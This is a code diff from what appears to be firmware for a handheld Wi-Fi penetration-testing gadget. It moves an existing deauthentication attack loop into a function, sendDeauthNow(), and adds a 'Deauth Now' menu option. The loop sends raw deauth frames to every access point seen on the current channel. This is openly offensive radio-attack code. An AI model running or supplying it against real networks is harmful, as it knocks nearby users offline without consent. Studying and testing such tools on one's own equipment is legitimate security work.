@@ -1039,6 +1039,30 @@ static std::vector<String> recentSsidsOnChannel(uint8_t channel, size_t maxItems
     return out;
 }
 
+static void sendDeauthNow() {
+    bool deauth_sent = false;
+    if (registeredBeacons.size() > 40)
+        registeredBeacons.clear();
+    Serial.println("<<---- Sending deauth packets ---->>");
+    for (auto registeredBeacon : registeredBeacons) {
+        if (registeredBeacon.channel == ch) {
+            memcpy(&ap_record.bssid, registeredBeacon.MAC, 6);
+            wsl_bypasser_send_raw_frame(&ap_record, registeredBeacon.channel);
+            send_raw_frame(deauth_frame, 26);
+            deauth_sent = true;
+            deauth_counter++;
+            vTaskDelay(2 / portTICK_RATE_MS);
+        }
+    }
+    if (deauth_sent) {
+        tft.setTextSize(1);
+        tft.setTextDatum(0);
+        tft.drawString("Deauth sent.", DEAUTH_MSG_X, DEAUTH_MSG_Y);
+        deauth_displayed = true;
+        deauth_display_ts = millis();
+    }
+}
+
 //===== SETUP =====//
 void sniffer_setup() {
     // Stop WebUI before setting WiFi mode for sniffer
@@ -1238,6 +1262,7 @@ void sniffer_setup() {
                      redraw = true;
                  }                                                                                        },
                 {deauth ? "Disable deauth attack" : "Enable deauth attack", [&]() { deauth = !deauth; }   },
+                {"Deauth Now",                                              [&]() { sendDeauthNow(); } },
                 {"Reset Counters",
                  [&]() {
                      packet_counter = 0;
@@ -1345,33 +1370,7 @@ void sniffer_setup() {
         }
 
         if (deauth && (millis() - deauth_tmp) > DEAUTH_INTERVAL) {
-            bool deauth_sent = false;
-            if (registeredBeacons.size() > 40)
-                registeredBeacons.clear(); // Clear registered beacons to restart search and avoid restarts
-            Serial.println("<<---- Starting Deauthentication Process ---->>");
-            for (auto registeredBeacon : registeredBeacons) {
-                if (registeredBeacon.channel == ch) {
-                    memcpy(&ap_record.bssid, registeredBeacon.MAC, 6);
-                    wsl_bypasser_send_raw_frame(
-                        &ap_record, registeredBeacon.channel
-                    ); // writes the buffer with the information
-                    // XXX: ap_record reused between this and wifi_atks.h
-                    send_raw_frame(deauth_frame, 26);
-                    deauth_sent = true;
-                    deauth_counter++;
-                    vTaskDelay(2 / portTICK_RATE_MS);
-                }
-            }
-
-            if (deauth_sent) {
-                // draw the message and start the timer
-                tft.setTextSize(1);  // optional, keep consistent with your UI
-                tft.setTextDatum(0); // optional: ensure text draws from top-left if using TFT_eSPI-like API
-                tft.drawString("Deauth sent.", DEAUTH_MSG_X, DEAUTH_MSG_Y);
-                deauth_displayed = true;
-                deauth_display_ts = millis();
-            }
-
+            sendDeauthNow();
             deauth_tmp = millis();
         }
 
